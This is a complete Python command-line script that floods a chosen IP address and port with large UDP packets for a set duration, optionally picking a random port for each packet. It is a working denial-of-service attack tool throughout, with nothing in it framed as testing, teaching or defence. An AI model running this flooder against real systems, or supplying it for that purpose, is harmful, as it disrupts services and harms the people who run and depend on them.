import socket
import random
import sys
import time

def read_user_agents(file):
    with open(file, 'r') as f:
        return [line.strip() for line in f.readlines()]

def UDPFlood(ip, port, dur):
    user_agents = read_user_agents('ua.txt')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    randport = (True, False)[port == 0]
    clock = (lambda: 0, time.time)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]

    while True:
        user_agent = random.choice(user_agents)
        bytes = user_agent.encode('utf-8') + b" " * (65500 - len(user_agent))  
        port = (random.randint(1, 65535), port)[randport]
        
        if time.time() < duration:
            sock.sendto(bytes, (ip, port))
        else:
            break

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit('Usage: python udp.py ip port time')

    ip = sys.argv[1]
    port = int(sys.argv[2])
    dur = int(sys.argv[3])

    UDPFlood(ip, port, dur)
